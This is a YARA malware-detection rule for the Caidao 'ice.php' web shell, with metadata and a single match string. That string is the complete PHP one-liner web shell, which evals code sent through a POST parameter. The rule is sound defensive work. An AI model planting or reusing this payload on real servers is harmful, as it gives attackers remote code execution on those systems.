rule webshell_caidao_shell_ice_2 {
  meta:
    author = "Spider"
    comment = "None"
    date = "2014/01/28"
    description = "Web Shell - file ice.php"
    family = "None"
    hacker = "None"
    hash = "1d6335247f58e0a5b03e17977888f5f2"
    judge = "black"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "None"
    score = 70
    threatname = "None"
    threattype = "None"
  strings:
    $s0 = "<?php ${${eval($_POST[ice])}};?>" fullword
  condition:
    all of them
}